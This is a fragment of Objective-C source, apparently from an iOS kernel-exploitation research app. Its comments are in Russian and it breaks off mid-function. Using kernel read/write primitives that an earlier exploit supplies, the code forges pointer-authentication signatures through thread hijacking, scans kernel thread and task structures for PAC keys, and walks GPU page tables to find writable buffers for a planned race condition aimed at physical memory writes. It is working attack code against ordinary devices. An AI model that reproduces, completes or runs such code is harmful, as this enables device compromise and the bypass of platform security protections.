    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:p];
    if (!h) {
        [line writeToFile:p atomically:NO encoding:NSUTF8StringEncoding error:nil];
        return;
    }
    [h seekToEndOfFile];
    [h writeData:[line dataUsingEncoding:NSUTF8StringEncoding]];
    [h closeFile];
}

static volatile uint64_t g_kppark_stop = 0;
static void *kpParkWorker(void *arg)
{
    (void)arg;
    while (!g_kppark_stop) usleep(5000);
    return NULL;
}

+ (NSString *)pacTestReport
{
    NSMutableString *r = [NSMutableString string];
    NSString *pacPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-pac.txt"];
    [@"" writeToFile:pacPath atomically:NO encoding:NSUTF8StringEncoding error:nil];
    void (^pacnote)(NSString *) = ^(NSString *s){ kpNote(r, s); kpPacLive([s stringByAppendingString:@"\n"]); };
    pacnote(@"=== PAC forging test (TaskRop remotepac port) ===");
    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [r appendString:@"KRW не жив — сначала эксплойт.\n"];
        return r;
    }
    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; kpPacLive(@"FAIL: is_table\n"); return r; }

    mach_port_t tport = mach_thread_self();
    uint64_t threadVA = [self rcResolveThreadKVA:tport];
    mach_port_deallocate(mach_task_self(), tport);
    if (!threadVA) { [r appendString:@"FAIL: thread_t VA не резолвится\n"]; kpPacLive(@"FAIL: thread_t VA\n"); return r; }
    pacnote([NSString stringWithFormat:@"  наш thread_t @ %#llx", (unsigned long long)threadVA]);

    extern uint64_t kp_rc_kread64(uint64_t);
    extern uint64_t kp_pacia(uint64_t, uint64_t);
    extern uint64_t kp_ptrauthstrdisc(const char *);
    extern bool kp_pacsignworks(void);
    extern uint64_t kp_remotepac(uint64_t, uint64_t, uint64_t);
    extern uint64_t kp_findpacia(void);
    extern void kp_upcbcalib(uint64_t);

    uint64_t keya = kp_rc_kread64(threadVA + 0x1B0);
    uint64_t keyb = kp_rc_kread64(threadVA + 0x1B8);
    pacnote([NSString stringWithFormat:@"  наши PAC keys: rop_pid=%#llx jop_pid=%#llx",
              (unsigned long long)keya, (unsigned long long)keyb]);

    BOOL signworks = kp_pacsignworks();
    pacnote([NSString stringWithFormat:@"  userland pacia работает: %@", signworks ? @"да" : @"нет"]);

    uint64_t gadget = kp_findpacia();
    pacnote([NSString stringWithFormat:@"  pacia gadget @ %#llx %@", (unsigned long long)gadget,
              gadget ? @"" : @"  (не найден в нашем бинаре — remotepac не взлетит)"]);

    // sign a test pointer with OUR keys through the hijacked pacthread
    uint64_t address = 0x0000000041414141ULL;
    uint64_t modifier = kp_ptrauthstrdisc("pc");
    uint64_t expected = kp_pacia(address, modifier);
    pacnote([NSString stringWithFormat:@"  цель: подписать %#llx mod=%#llx (ожидаем %#llx через наш userland pacia)",
              (unsigned long long)address, (unsigned long long)modifier, (unsigned long long)expected]);

    pacnote(@"  → вызываю kp_remotepac (thread hijack)…");
    uint64_t signed_ = kp_remotepac(threadVA, address, modifier);
    pacnote([NSString stringWithFormat:@"  remotepac → %#llx %@", (unsigned long long)signed_,
              signed_ == expected ? @"— СОВПАЛО С ОЖИДАНИЕМ: PAC forging через thread hijack РАБОТАЕТ!"
                                  : (signed_ == (uint64_t)-1 || signed_ == 0 ? @"— не получилось" : @"— получена, но != ожиданию (ключи другие?)")]);
    if (signed_ == expected) {
        [r appendString:@"\n=== PAC FORGING VERIFIED: подписываем любые указатели любыми ключами — с kernel_task keys это kcall на arm64e → SPTM retype → physwrite ===\n"];
        kpPacLive(@"\n=== PAC FORGING VERIFIED ===\n");

        // --- kernel keys probe: есть ли у kernel_task тредов PAC-ключи? ---
        pacnote(@"--- kernel keys probe ---");
        // task_self() через сокет вернул 0 — резолвим от нашего thread_t:
        // thread+0x3E8 = t_tro (thread_ro), thread_ro+0x28 = tro_task (18.6).
        uint64_t tro = kp_untag_ptr(kp_rc_kread64(threadVA + 0x3E8));
        uint64_t selfTask = kp_untag_ptr(kp_rc_kread64(tro + 0x28));
        pacnote([NSString stringWithFormat:@"  tro=%#llx selfTask=%#llx selfThread=%#llx", tro, selfTask, threadVA]);
        if (!kpLooksLikeKernelPointer(selfTask)) { pacnote(@"  selfTask не резолвится — стоп"); return r; }
        // дамп для глаз: очередь тредов = два соседних heap-указателя в task,
        // линк в thread_t = указатель обратно на очередь
        NSMutableString *dumpT = [NSMutableString stringWithString:@"  task dump:"];
        for (uint32_t o = 0x40; o <= 0xC0; o += 8)
            [dumpT appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(selfTask + o)];
        pacnote(dumpT);
        NSMutableString *dumpTh = [NSMutableString stringWithString:@"  thread dump:"];
        for (uint32_t o = 0x300; o <= 0x400; o += 8)
            [dumpTh appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(threadVA + o)];
        pacnote(dumpTh);
        // Эмпирическая кросс-разметка: второй припаркованный тред. Ищем
        // A+l == B+l (соседние звенья одной очереди) и поля таска,
        // указывающие прямо в наши thread_t.
        uint32_t taskQ = 0, linkQ = 0;
        g_kppark_stop = 0;
        pthread_t pb;
        uint64_t thrB = 0;
        if (pthread_create(&pb, NULL, kpParkWorker, NULL) == 0) {
            pthread_detach(pb);
            usleep(2000);
            thrB = [self rcResolveThreadKVA:pthread_mach_thread_np(pb)];
        }
        pacnote([NSString stringWithFormat:@"  parked thread B=%#llx", thrB]);
        if (thrB) {
            for (uint32_t l = 0x300; l <= 0x500; l += 8) {
                uint64_t vA = kp_untag_ptr(kp_rc_kread64(threadVA + l));
                uint64_t vB = kp_untag_ptr(kp_rc_kread64(thrB + l));
                if (vA >= thrB && vA < thrB + 0x800) {
                    pacnote([NSString stringWithFormat:@"  A+%#x → B+%#llx%@", l, vA - thrB,
                              (vA - thrB) == l ? @" ← ЛИНК" : @""]);
                    if ((vA - thrB) == l && !linkQ) linkQ = l;
                }
                if (vB >= threadVA && vB < threadVA + 0x800) {
                    pacnote([NSString stringWithFormat:@"  B+%#x → A+%#llx%@", l, vB - threadVA,
                              (vB - threadVA) == l ? @" ← ЛИНК" : @""]);
                    if ((vB - threadVA) == l && !linkQ) linkQ = l;
                }
            }
            for (uint32_t t = 0x40; t <= 0x140; t += 8) {
                uint64_t v = kp_untag_ptr(kp_rc_kread64(selfTask + t));
                const char *who = NULL; uint64_t base = 0;
                if (v >= threadVA && v < threadVA + 0x800) { who = "A"; base = threadVA; }
                else if (v >= thrB && v < thrB + 0x800) { who = "B"; base = thrB; }
                if (who) {
                    pacnote([NSString stringWithFormat:@"  task+%#x → %s+%#llx ← ГОЛОВА?", t, who, v - base]);
                    if (!taskQ) taskQ = t;
                }
            }
            // валидация пары: head.next-thread должен вести на свой таск
            if (taskQ && linkQ) {
                uint64_t A0 = kp_untag_ptr(kp_rc_kread64(selfTask + taskQ));
                uint64_t thr0 = A0 - linkQ;
                uint64_t tro0 = kp_untag_ptr(kp_rc_kread64(thr0 + 0x3E8));
                uint64_t tsk0 = kp_untag_ptr(kp_rc_kread64(tro0 + 0x28));
                pacnote([NSString stringWithFormat:@"  проверка: thr0=%#llx tsk0=%#llx%@", thr0, tsk0,
                          (tsk0 == selfTask) ? @" ← ПАРА ВЕРНАЯ" : @" — пара неверна, сброс"]);
                if (tsk0 != selfTask) { taskQ = 0; linkQ = 0; }
            }
        }
        g_kppark_stop = 1;
        pacnote([NSString stringWithFormat:@"  self-calib: task.threads=0x%x link=0x%x %@", taskQ, linkQ,
                  taskQ ? @"" : @"— НЕ ПОДОБРАЛИ (стоп)"]);
        if (taskQ) {
            uint64_t ktProc = [self findProcByCommName:"kernel_task" log:r];
            if (ktProc) {
                uint64_t p_proc_ro = kp_untag_ptr(kp_rc_kread64(ktProc + off_proc_p_proc_ro));
                uint64_t ktTask = kp_untag_ptr(kp_rc_kread64(p_proc_ro + off_proc_ro_pr_task));
                pacnote([NSString stringWithFormat:@"  kernel_task task @ %#llx", ktTask]);
                uint64_t head = ktTask + taskQ;
                uint64_t cur = kp_untag_ptr(kp_rc_kread64(head));
                uint64_t ktThread = (cur && cur != head && kpLooksLikeKernelPointer(cur)) ? cur - linkQ : 0;
                pacnote([NSString stringWithFormat:@"  первый kernel thread_t @ %#llx", ktThread]);
                if (ktThread) {
                    uint64_t ka = kp_rc_kread64(ktThread + 0x1B0);
                    uint64_t kb = kp_rc_kread64(ktThread + 0x1B8);
                    pacnote([NSString stringWithFormat:@"  kernel thread keys: a=%#llx b=%#llx %@", ka, kb,
                              (ka || kb) ? @"" : @"— НУЛИ: у kernel-тредов нет user-ключей, kernel-signing через thread_t закрыт"]);
                    // kernel remotepac СНЯТ С ПРОГОНА: у kernel-треда «upcb» — мусор,
                    // запись оттуда в worker = copy_validate panic (2 ребута).
                    pacnote(@"  kernel remotepac: пропущен (путь мёртв — ключей нет; upcb kernel-треда невалиден)");
                }
            }
        }

        // --- key storage hunt: где РЕАЛЬНО лежит jop_pid? ---
        {
            pacnote(@"--- key storage hunt ---");
            uint64_t jop = kp_rc_kread64(threadVA + 0x1B8);
            uint64_t ftbl = [self frameTableVAWithLog:r];
            int tThread = kpVAType(threadVA, ftbl);
            int tTro = kpVAType(tro, ftbl);
            pacnote([NSString stringWithFormat:@"  jop_pid=%#llx · frame types: thread_t=0x%x thread_ro=0x%x (0x21=heap RW, 0x18=ROZONE)", (unsigned long long)jop, tThread, tTro]);
            // постраничный скан (16K страница зоны всегда замаплена целиком)
            NSMutableString *hits = [NSMutableString stringWithString:@"  jop_pid найден:"];
            int nh = 0;
            uint64_t pgT = threadVA & ~0x3FFFULL;
            for (uint64_t a = pgT; a < pgT + 0x4000 && nh < 10; a += 8)
                if (kp_rc_kread64(a) == jop) { [hits appendFormat:@" thread%+#llx", a - threadVA]; nh++; }
            uint64_t pgR = tro & ~0x3FFFULL;
            for (uint64_t a = pgR; a < pgR + 0x4000 && nh < 20; a += 8)
                if (kp_rc_kread64(a) == jop) { [hits appendFormat:@" tro%+#llx", a - tro]; nh++; }
            if (!nh) [hits appendString:@" НИГДЕ в страницах thread_t/thread_ro"];
            pacnote(hits);

            // contextData: отсюда ядро грузит ключи в CPU при context switch
            uint64_t cdata = kp_untag_ptr(kp_rc_kread64(threadVA + 0xF8));
            int tCd = kpVAType(cdata, ftbl);
            pacnote([NSString stringWithFormat:@"  machine.contextData=%#llx type=0x%x", cdata, tCd]);
            // указатели вокруг 0xF0-0x110 глазами
            NSMutableString *dumpM = [NSMutableString stringWithString:@"  machine ptrs:"];
            for (uint32_t o = 0xE0; o <= 0x120; o += 8)
                [dumpM appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(threadVA + o)];
            pacnote(dumpM);
            // upcb: user pcb с arm_pac_key_state_t
            uint64_t upcb = kp_untag_ptr(kp_rc_kread64(threadVA + 0x100));
            int tUp = kpVAType(upcb, ftbl);
            pacnote([NSString stringWithFormat:@"  machine.upcb=%#llx type=0x%x", upcb, tUp]);
            if (kpLooksLikeKernelPointer(upcb)) {
                NSMutableString *ups = [NSMutableString stringWithString:@"  upcb scan:"];
                int nu = 0;
                uint64_t pgU = upcb & ~0x3FFFULL;
                for (uint64_t a = pgU; a < pgU + 0x4000 && nu < 24; a += 8) {
                    uint64_t v = kp_rc_kread64(a);
                    if (v == jop) { [ups appendFormat:@" JOP@%+#llx", a - upcb]; nu++; }
                }
                if (!nu) [ups appendString:@" jop_pid тут нет"];
                pacnote(ups);
                NSMutableString *dumpU = [NSMutableString stringWithString:@"  upcb dump:"];
                for (uint32_t o = 0; o < 0x100; o += 8)
                    [dumpU appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(upcb + o)];
                pacnote(dumpU);
            }
            // калибровка upcb-слотов: какой оффсет реально влияет на pacia/pacib
            pacnote(@"--- upcb slot calibration ---");
            kp_upcbcalib(threadVA);
            if (kpLooksLikeKernelPointer(cdata)) {
                NSMutableString *cd = [NSMutableString stringWithString:@"  contextData scan:"];
                int nc = 0;
                uint64_t pgC = cdata & ~0x3FFFULL;
                for (uint64_t a = pgC; a < pgC + 0x4000 && nc < 24; a += 8) {
                    uint64_t v = kp_rc_kread64(a);
                    if (v == jop) { [cd appendFormat:@" JOP@%+#llx", a - cdata]; nc++; }
                    else if (v == kp_rc_kread64(threadVA + 0x1B0)) { [cd appendFormat:@" ROP@%+#llx", a - cdata]; nc++; }
                }
                if (!nc) [cd appendString:@" ключи из thread_t тут не встречаются"];
                pacnote(cd);
                // дамп первых 0x80 байт contextData — глазами видим ключевой блок
                NSMutableString *dumpC = [NSMutableString stringWithString:@"  cdata dump:"];
                for (uint32_t o = 0; o < 0x80; o += 8)
                    [dumpC appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(cdata + o)];
                pacnote(dumpC);
            }
        }
    }
    return r;
}

// Полный walk+скан одного mapper'а: L1arr → L2 → L3 → наш PTE, скан L3 по PA.
// Возвращает kernel VA L3-страницы (или 0).
static void kpGartLive(NSString *line);
#define GNOTE2(...) do { kpNote(r, (__VA_ARGS__)); kpGartLive((__VA_ARGS__)); } while (0)
#define GNOTE(...) GNOTE2(__VA_ARGS__)
static uint64_t kpUatWalkScan(NSMutableString *r, uint64_t mapper, uint64_t gpuVA, uint64_t pa0, const char *label)
{
    extern uint64_t kp_rc_kread64(uint64_t);
    if (!kpLooksLikeKernelPointer(mapper)) { GNOTE2( [NSString stringWithFormat:@"  walk[%s]: mapper невалиден", label]); return 0; }
    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: mapper=%#llx ops[0]=%#llx", label, mapper, kp_rc_kread64(mapper)]);
    uint64_t L1arr = kp_untag_ptr(kp_rc_kread64(mapper + 0x30));
    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: L1arr=%#llx", label, L1arr]);
    if (!L1arr) return 0;
    uint32_t pc = (uint32_t)((gpuVA >> 36) & 0x7FF);
    uint32_t pd = (uint32_t)((gpuVA >> 25) & 0x7FF);
    uint32_t pt = (uint32_t)((gpuVA >> 14) & 0x7FF);
    uint64_t e1 = kp_rc_kread64(L1arr + (uint64_t)pc * 8);
    uint64_t L2pa = e1 & 0xFFFFFFFFF000ULL;
    uint64_t L2 = (L2pa && gPrimitives.phystokv) ? gPrimitives.phystokv(L2pa) : 0;
    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: pc=%u e1=%#llx → L2kv=%#llx", label, pc, e1, L2]);
    if (!L2) return 0;
    uint64_t e2 = kp_rc_kread64(L2 + (uint64_t)pd * 8);
    uint64_t L3pa = e2 & 0xFFFFFFFFF000ULL;
    uint64_t L3 = (L3pa && gPrimitives.phystokv) ? gPrimitives.phystokv(L3pa) : 0;
    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: pd=%u e2=%#llx → L3kv=%#llx", label, pd, e2, L3]);
    if (!L3) return 0;
    uint64_t pte = kp_rc_kread64(L3 + (uint64_t)pt * 8);
    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: pt=%u PTE=%#llx (наш PA=%#llx)", label, pt, pte, pa0]);
    int nnz = 0;
    NSMutableString *nz = [NSMutableString stringWithString:@""];
    for (int j = 0; j < 2048; j++) {
        uint64_t e = kp_rc_kread64(L3 + (uint64_t)j * 8);
        if (!e) continue;
        if (nnz < 12) [nz appendFormat:@" [%d]=%#llx", j, e];
        nnz++;
        if (pa0 && (e & 0xFFFFFFFFF000ULL) == (pa0 & 0xFFFFFFFFF000ULL))
            GNOTE2( [NSString stringWithFormat:@"  ★ НАШ PTE: %s L3[%d]=%#llx", label, j, e]);
    }
    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: L3 живых записей: %d%@", label, nnz, nz]);
    return L3;
}

#pragma mark - GART recon (IOGPU → AGXSecureGart, read-only)

extern uint64_t kp_rc_kread64(uint64_t);

static void *gBufContents = NULL;
static uint64_t gBufGPUVA = 0;
static id gGartBuf = nil; // удерживаем MTLBuffer живым между стадиями

// Live-запись GART-стадий: паника не сотрёт готовое (как kexproof-pac.txt).
static BOOL gGartLive = NO;
static void kpGartLive(NSString *line)
{
    if (!gGartLive) return;
    // os_log → device syslog, читается по USB через idevicesyslog В РЕАЛЬНОМ
    // времени — паника ничего не забирает (не файл, не контейнер).
    os_log_error(OS_LOG_DEFAULT, "[GART] %{public}s", [line UTF8String]);
    extern void KPLogDirect(const char *);
    KPLogDirect([line UTF8String]); // зеркало в kexproof-live.log (переживает ребут)
    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-gart.txt"];
    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:p];
    NSData *d = [[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
    if (!h) { [d writeToFile:p atomically:NO]; return; }
    [h seekToEndOfFile];
    [h writeData:d];
    [h synchronizeFile];   // fsync КАЖДОЙ строки — EL2-ресет не сожрёт page cache
    [h closeFile];
}

// Дамп pointer-полей объекта: ТОЛЬКО значения, без дереференсов (дереф по
// physmap в выключенный carveout = аппаратный ресет без паник-лога, проверено).
static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name, uint32_t size)
{
    GNOTE2( [NSString stringWithFormat:@"  --- %s @ %#llx (pointer fields):", name, objVA]);
    int shown = 0;
    for (uint32_t o = 0; o < size && shown < 128; o += 8) {
        uint64_t v = kp_rc_kread64(objVA + o);
        uint64_t u = kp_untag_ptr(v);
        if (!kpLooksLikeKernelPointer(u)) continue;
        // v == u → чистый указатель; иначе — PAC-тегнутый (пишем оба)
        if (v == u)
            GNOTE2( [NSString stringWithFormat:@"    +%#04x → %#llx", o, u]);
        else
            GNOTE2( [NSString stringWithFormat:@"    +%#04x → %#llx (raw %#llx)", o, u, v]);
        shown++;
    }
    if (!shown) GNOTE2( @"    (нет kernel-указателей)");
}

// Гейт для hunt-указателей: kernel band, не EL2, PA в managed DRAM
// (иначе чтение MMIO/carveout через физапертуру = паника).
static BOOL kpHuntPtrOK(uint64_t v)
{
    v = kp_untag_ptr(v);
    if (!kpLooksLikeKernelPointer(v) || kpVAIsEL2Domain(v)) return NO;
    uint64_t pa = kvtophys(v);
    return pa && kpPAIsManaged(pa);
}

+ (NSString *)gartProbeReport
{
    NSMutableString *r = [NSMutableString string];
    [[NSFileManager defaultManager] removeItemAtPath:[NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-gart.txt"] error:nil];
    gGartLive = YES;
    GNOTE( @"=== GART descriptor hunt (registry walk, RE-цепочка) ===");
    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [r appendString:@"KRW не жив — сначала эксплойт.\n"];
        gGartLive = NO;
        return r;
    }
    extern uint64_t kp_rc_kread64(uint64_t);
    extern void kp_rc_kwrite64(uint64_t, uint64_t);

    // === LIST-ADDR: compacted list {VA, PA>>14} по формуле RE:
    //     cpuData = 0xfffffff00aa44000 + slide (cpu0 template)
    //     slotVA  = 0xfffffff00aa48000 + slide + (kread(cpuData+0x1a0) >> 16)
    //     bufVA   = kread(slotVA + 8)
    //     Дамп записей, frame type буфера, live-catch нашей записи после
    //     submit. Если буфер writable (0x21/0x0b) — следующая сборка race.
    extern uint64_t kp_rc_kread64(uint64_t);
    uint64_t kc = kconstant(base);
    uint64_t slide = kc - 0xfffffff007004000ULL;
    uint64_t cpuData = 0xfffffff00aa44000ULL + slide;
    uint64_t val = kp_rc_kread64(cpuData + 0x1a0);
    uint64_t slotVA = 0xfffffff00aa48000ULL + slide + (val >> 16);
    uint64_t bufVA = kp_rc_kread64(slotVA + 8);
    // альтернативная интерпретация (константа уже runtime-форма, без slide):
    uint64_t slotVA2 = 0xfffffff00aa48000ULL + (val >> 16);
    uint64_t bufVA2 = kp_rc_kread64(slotVA2 + 8);
    GNOTE( [NSString stringWithFormat:@"  slide=%#llx val(+0x1a0)=%#llx", slide, val]);
    GNOTE( [NSString stringWithFormat:@"  A: slotVA=%#llx bufVA=%#llx", slotVA, bufVA]);
    GNOTE( [NSString stringWithFormat:@"  B(no-slide): slotVA=%#llx bufVA=%#llx", slotVA2, bufVA2]);
    if (!kpLooksLikeKernelPointer(bufVA) && kpLooksLikeKernelPointer(bufVA2)) {
        GNOTE( @"  интерпретация A невалидна — берём B");
        bufVA = bufVA2;
    }
    if (!kpLooksLikeKernelPointer(bufVA)) { GNOTE( @"FAIL: bufVA не kernel pointer"); gGartLive = NO; return r; }

    uint64_t tableVA = [self frameTableVAWithLog:r];
    int ft = kpVAType(bufVA, tableVA);
    GNOTE( [NSString stringWithFormat:@"  bufVA=%#llx frame type=0x%x %@", bufVA, ft,
               (ft == 0x21 || ft == 0x0b) ? @"— ПИШЕТСЯ, race возможен!" :
               ft == 0x37 ? @"— per-CPU (читается, запись = EL2-килл)" : @""]);

    // дамп 16 записей (stride 0x10: {VA, PA>>14})
    GNOTE( @"  --- 16 записей листа (rest state):");
    for (int i = 0; i < 16; i++) {
        uint64_t va = kp_rc_kread64(bufVA + (uint64_t)i * 0x10);
        uint64_t pa14 = kp_rc_kread64(bufVA + (uint64_t)i * 0x10 + 8);
        if (va || pa14)
            GNOTE( [NSString stringWithFormat:@"    [%2d] VA=%#llx PA=%#llx", i, va, pa14 << 14]);
    }

    // live-catch: создаём private-буфер, submit, сразу перечитываем лист —
    // наши записи {gpuVA, PA>>14} должны мелькнуть.
    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    id<MTLBuffer> bufB = mtl ? [mtl newBufferWithLength:0x44000 options:MTLResourceStorageModePrivate] : nil;
    if (!bufB) { GNOTE( @"FAIL: private buffer"); gGartLive = NO; return r; }
    uint64_t gvaB = (uint64_t)bufB.gpuAddress;
    GNOTE( [NSString stringWithFormat:@"  live-catch: priv B gpuAddr=%#llx — submit и перечитываю", gvaB]);
    @autoreleasepool {
        NSError *err = nil;
        id<MTLLibrary> lib = [mtl newLibraryWithSource:@"kernel void wf(device ulong *o [[buffer(0)]]) { o[0] = 1; }" options:nil error:&err];
        id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"wf"] : nil;
        id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
        id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
        id<MTLCommandBuffer> cb = q ? [q commandBuffer] : nil;
        id<MTLComputeCommandEncoder> enc = cb ? [cb computeCommandEncoder] : nil;
        if (enc) {
            [enc setComputePipelineState:pipe];
            [enc setBuffer:bufB offset:0 atIndex:0];
            [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [enc endEncoding];
            [cb commit];
            [cb waitUntilCompleted];
        }
        GNOTE( [NSString stringWithFormat:@"  submit: status=%ld %@", (long)cb.status, cb.error ? cb.error.description : @"ok"]);
    }
    int caught = 0;
    for (int i = 0; i < 64; i++) {
        uint64_t va = kp_rc_kread64(bufVA + (uint64_t)i * 0x10);
        uint64_t pa14 = kp_rc_kread64(bufVA + (uint64_t)i * 0x10 + 8);
        if (!va && !pa14) continue;
        NSString *mark = (va == gvaB) ? @"  ◄◄◄ НАША ЗАПИСЬ!" : @"";
        GNOTE( [NSString stringWithFormat:@"    [%2d] VA=%#llx PA=%#llx%@", i, va, pa14 << 14, mark]);
        if (va == gvaB) caught++;
    }
    GNOTE( [NSString stringWithFormat:@"  live-catch: наших записей=%d · вердикт буфера ft=0x%x", caught, ft]);
    gGartLive = NO;
    return r;
}




#pragma mark - D1: TXM stack + frame-type recon (kread-only)

// Frame type of the page backing a kernel VA. -1 when untranslatable.
static int kpVAType(uint64_t va, uint64_t tableVA)
{
    if (!kpLooksLikeKernelPointer(va)) return -1;
    errno = 0;
    uint64_t pa = kvtophys(va);
    if (!pa || !kpPAIsManaged(pa)) return -1;
    return kpFrameTypeOfPAQuiet(tableVA, pa);
}

+ (NSString *)txmStackReconReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== D1: разведка TXM stack в thread_t + калибровка frame types (kread-only, безопасно) ===\n"];
    if (!gPrimitives.kreadbuf) { [r appendString:@"KRW не жив — сначала эксплойт.\n"]; return r; }

    // 1. Frame table (proved EL1-readable in E1-E3).
    uint64_t tableVA = [self frameTableVAWithLog:r];
    if (!tableVA) { [r appendString:@"FAIL: frame table недоступна\n"]; return r; }

    // 2. self proc → task (standard chain). findProcByCommName ONLY — the
    //    EXP-01 candidate walk behind findSelfProcByComm/findProcByPid burns
    //    thousands of kreads through garbage chains and dies on a per-cpu
    //    zone bound check (this exact panic, zalloc.c:1308).
    uint64_t selfProc = [self findProcByCommName:getprogname() log:r];
    if (!selfProc) selfProc = [self findProcByCommName:"KexProof" log:r];
    if (!selfProc) { [r appendString:@"FAIL: self proc не найден fast walk'ом\n"]; return r; }
    uint64_t procRo = 0, selfTask = 0;
    if (!kpRead(selfProc + koffsetof(proc, proc_ro), &procRo, 8, "self proc_ro", r)) return r;
    procRo = kp_untag_ptr(procRo);
    if (!kpRead(procRo + off_proc_ro_pr_task, &selfTask, 8, "self task", r)) return r;
    selfTask = kp_untag_ptr(selfTask);
    if (!kpLooksLikeKernelPointer(selfTask)) { [r appendString:@"FAIL: self task\n"]; return r; }
    kpNote(r, [NSString stringWithFormat:@"  self: proc=%#llx task=%#llx", selfProc, selfTask]);

    // 3. Our thread port → itk_space → is_table (SMR) → entry → ie_object →
    //    ip_kobject → thread_t (the E10 ladder, proven on-device).
    mach_port_t tport = mach_thread_self();
    uint64_t spaceRaw = 0, itkSpace = 0, tableRaw = 0, table = 0;
    if (!kpRead(selfTask + off_task_itk_space, &spaceRaw, 8, "task.itk_space", r)) return r;
    itkSpace = kp_untag_ptr(spaceRaw);
    if (!kpRead(itkSpace + off_ipc_space_is_table, &tableRaw, 8, "is_table", r)) return r;
    if (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
        table = kp_untag_ptr(kpSMRDecode(tableRaw));
    else
        table = kp_untag_ptr(tableRaw);
    if (!kpLooksLikeKernelPointer(table)) { [r appendString:@"FAIL: is_table\n"]; return r; }
    uint64_t entryVA = table + (uint64_t)sizeof_ipc_entry * (tport >> 8);
    uint64_t objRaw = 0;
    if (!kpRead(entryVA + off_ipc_entry_ie_object, &objRaw, 8, "ie_object", r)) return r;
    uint64_t portVA = kp_untag_ptr(objRaw);
    if (!kpLooksLikeKernelPointer(portVA)) { [r appendString:@"FAIL: ie_object\n"]; return r; }
    uint64_t kobjRaw = 0;
    if (!kpRead(portVA + off_ipc_port_ip_kobject, &kobjRaw, 8, "ip_kobject", r)) return r;
    uint64_t threadVA = kp_untag_ptr(kobjRaw);
    kpNote(r, [NSString stringWithFormat:@"  thread port %#x → ipc_port=%#llx → thread_t=%#llx",
              (unsigned)tport, (unsigned long long)portVA, (unsigned long long)threadVA]);
    mach_port_deallocate(mach_task_self(), tport);
    if (!kpLooksLikeKernelPointer(threadVA)) { [r appendString:@"FAIL: thread_t не kernel VA\n"]; return r; }

    // 4. Anchor frame types (calibrates the enum against known roles).
    [r appendString:@"\n  --- калибровка типов по якорям ---\n"];
    struct { const char *role; uint64_t va; } anchors[8];
    int na = 0;
    anchors[na].role = "kernel text (base)"; anchors[na].va = kconstant(base); na++;
    anchors[na].role = "frame table (сама)"; anchors[na].va = tableVA; na++;
    anchors[na].role = "наш proc (heap)"; anchors[na].va = selfProc; na++;
    anchors[na].role = "наш task"; anchors[na].va = selfTask; na++;
    anchors[na].role = "наш thread_t"; anchors[na].va = threadVA; na++;
    uint64_t ucredVA = 0;
    if (kpRead(procRo + koffsetof(proc_ro, ucred), &ucredVA, 8, "proc_ro.ucred", r)) {
        ucredVA = kp_untag_ptr(ucredVA);
        if (kpLooksLikeKernelPointer(ucredVA)) { anchors[na].role = "наш ucred (RO?)"; anchors[na].va = ucredVA; na++; }
    }
    // our userland page through our own pmap chain
    uint64_t map = 0, pmap = 0, ttep = 0;
    kpRead(selfTask + off_task_map, &map, 8, "task.map", r);
    map = kp_untag_ptr(map);
    kpRead(map + koffsetof(vm_map, pmap), &pmap, 8, "map.pmap", r);
    pmap = kp_untag_ptr(pmap);
    kpRead(pmap + koffsetof(pmap, ttep), &ttep, 8, "pmap.ttep", r);
    ttep = kp_untag_ptr(ttep);
    uint8_t *upage = valloc(0x4000);
    memset(upage, 0x41, 0x4000);
    for (int i = 0; i < na; i++) {
        int t = kpVAType(anchors[i].va, tableVA);
        kpNote(r, [NSString stringWithFormat:@"    %-22s VA=%#llx type=%@",
                  anchors[i].role, (unsigned long long)anchors[i].va,
                  t < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x%@", t,
                     (gHeapTypeKnown && t == gHeapFrameType) ? @" (XNU_DEFAULT)" : @""]]);
    }
    if (ttep) {
        uint64_t upa = vtophys(ttep, (uint64_t)upage);
        int t = upa ? kpFrameTypeOfPAQuiet(tableVA, upa) : -1;
        kpNote(r, [NSString stringWithFormat:@"    %-22s VA=%#llx PA=%#llx type=%@",
                  "userland malloc стр.", (unsigned long long)(uint64_t)upage, (unsigned long long)upa,
                  t < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", t]]);
    }
    free(upage);

    // 5. thread_t pointer scan: every kernel-VA field + its page's frame type.
    //    The TXM stack is the one with type 0x2a — no offset table needed.
    [r appendString:@"\n  --- скан thread_t (0x1000 байт): kernel VA + frame type ---\n"];
    uint32_t tsz = 0x1000;
    uint8_t *tbuf = malloc(tsz);
    memset(tbuf, 0, tsz);
    int txmOff = -1;
    NSMutableSet *before = [NSMutableSet set];
    if (kpRead(threadVA, tbuf, tsz, "thread_t dump", r)) {
        for (uint32_t o = 0; o + 8 <= tsz; o += 8) {
            uint64_t q = 0;
            memcpy(&q, tbuf + o, 8);
            uint64_t va = kp_untag_ptr(q);
            if (!kpLooksLikeKernelPointer(va)) continue;
            [before addObject:@(va)];
